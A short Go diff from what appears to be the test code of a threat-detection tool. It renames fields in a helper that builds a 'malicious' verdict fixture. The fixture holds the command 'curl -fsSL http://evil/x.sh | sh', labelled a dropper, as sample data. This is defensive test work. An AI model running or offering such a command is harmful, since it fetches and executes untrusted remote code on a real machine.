@@ -13,9 +13,9 @@ import (
 
 func verdict(band string) types.Verdict {
 	return types.Verdict{
-		Pid: 4242, Command: "curl -fsSL http://evil/x.sh | sh",
-		Band: band, Verdict: "malicious", Score: 0.85,
-		Reason: "dropper", Mitre: []string{"T1059"}, Tactic: "Execution",
+		Executable: "/usr/bin/curl", Command: "curl -fsSL http://evil/x.sh | sh",
+		Band: band, Verdict: "malicious", RiskScore: 0.85,
+		Reason: "dropper", Mitre: []string{"T1059"}, RiskIndicators: []string{"curl|sh"},
 	}
 }
 
